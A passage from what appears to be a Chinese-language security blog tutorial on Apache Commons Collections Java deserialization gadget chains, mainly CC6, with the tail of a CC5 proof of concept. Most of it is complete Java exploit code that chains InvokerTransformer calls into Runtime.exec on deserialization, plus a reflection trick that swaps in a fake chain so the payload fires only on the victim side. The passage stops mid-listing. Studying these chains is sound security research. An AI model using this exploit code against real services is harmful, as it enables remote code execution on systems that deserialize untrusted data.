ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Field valF = BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valF.setAccessible(<span class="hljs-keyword">true</span>);<br>        valF.set(badAttributeValueExpException,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="Pre-5"><a href="#Pre-5" class="headerlink" title="Pre"></a>Pre</h3><h4 id="限制-5"><a href="#限制-5" class="headerlink" title="限制"></a>限制</h4><blockquote><p>jdk 暂无限制</p><p>CommonsCollections 3.1 - 3.2.1</p></blockquote><h4 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h4 id="关键类-5"><a href="#关键类-5" class="headerlink" title="关键类"></a>关键类</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure><p>CC6 仍然和 CC5 思路相同，前半部分都是 CC1，CC5 用了<code>TiedMapEntry.toString</code>方法进而调用其<code>getValue</code>，触发<code>LazyMap.get</code>后 RCE</p><p>CC6 使用的是<code>TiedMapEntry.hashcode</code>方法来触发的与 CC5<code>toString</code>一样调用其<code>getValue</code>，进而触发<code>LazyMap.get</code>RCE</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">//                , new ConstantTransformer(1)</span><br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();//CC5</span><br>        tiedMapEntry.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样的，我们需要一个类来调用其<code>hashCode</code>方法，CC6 使用的是<code>HashMap.hash</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里 key 并不可控，还得找调用其<code>hash</code>方法，还是<code>HashMap</code>中的<code>put</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>现在需要找到一个调用了<code>HashMap.put</code>并且第一个参数可控的方法，最终找到了<code>HashSet</code>复写点中的<code>put</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HashSet</span><span class="hljs-params">()</span> </span>&#123;<br>       map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span>&#123;<br>       ...<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>           <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>               E e = (E) s.readObject();<br>           map.put(e, PRESENT);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p><code>e</code>如何控制呢，看看<code>writeObject</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>    <span class="hljs-comment">// Write out any hidden serialization magic</span><br>    s.defaultWriteObject();<br><br>    <span class="hljs-comment">// Write out HashMap capacity and load factor</span><br>    s.writeInt(map.capacity());<br>    s.writeFloat(map.loadFactor());<br><br>    <span class="hljs-comment">// Write out size</span><br>    s.writeInt(map.size());<br><br>    <span class="hljs-comment">// Write out all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (E e : map.keySet())<br>        s.writeObject(e);<br>&#125;<br></code></pre></td></tr></table></figure><p>是通过<code>map.keySet</code>增强 for 写入的，因此<code>HashMap</code>中要调用<code>keySet</code>方法并传入任意值</p><p>整个链条清晰了，我们注意到<code>HashMap.put</code>调用<code>HashMap.hash</code>的过程很熟悉，没错正是<code>URLDNS</code>链中的内容，其实已经就可以通过<code>HashMap.readObject</code>来调用了</p><p>参考：<a href="https://blog.csdn.net/weixin_43263451/article/details/126073035">1</a> <a href="https://blog.csdn.net/weixin_43610673/article/details/125079601">2</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URLDNS: HashMap.readObject-&gt;HashMap.hash</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">...</span><br><span class="hljs-function">            <span class="hljs-title">for</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++)</span> </span>&#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>因此先来个简单的 poc(URLDNS 式，原谅我这样备注它)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br><span class="hljs-comment">//        ois.readObject();</span><br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>到这里就完了？其实还是编写过程中没有到达<code>ois.readObject</code>就已经触发，也就是说没有规避到本地触发，不信可以注释<code>ois.readObject</code>我们发现压根没有反序列化 RCE 成功，那就加一个假链，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;;<br>        ChainedTransformer fakechainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,fakechainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        Field iTransformersF = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        iTransformersF.setAccessible(<span class="hljs-keyword">true</span>);<br>        iTransformersF.set(fakechainedTransformer,transformers);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这个反射修改传入的是<code>Transformer[]</code>，不需要再 chain 一下了</p><p>现在就是好了，但是为什么没有执行成功，按着 p 牛思路调试，断点<code>readObject</code>步入，<code>LazyMap.get</code>方法内</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220925211304382.png"></p><p>if 判断进去了而没有调用<code>map.get</code>，这个<code>LazyMap</code>在哪里存了值呢，正如 yso 利用方式<code>HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</code>，也就是我们在规避本地触发的过程中，我们也调用到了<code>HashMap.put</code>!</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure><p>这就导致了<code>yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash </code>在这里也被调用了一次，而且因为规避用的<code>fakeChainedTransform</code>在这里产生了影响而没有触发命令执行，解决方法也简单，在序列化前移除这个键</p><h3 id="Gadget-5"><a href="#Gadget-5" class="headerlink" title="Gadget"></a>Gadget</h3><h4 id="①p-牛简化"><a href="#①p-牛简化" class="headerlink" title="①p 牛简化"></a>①p 牛简化</h4><p><code>HashMap+HashMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span 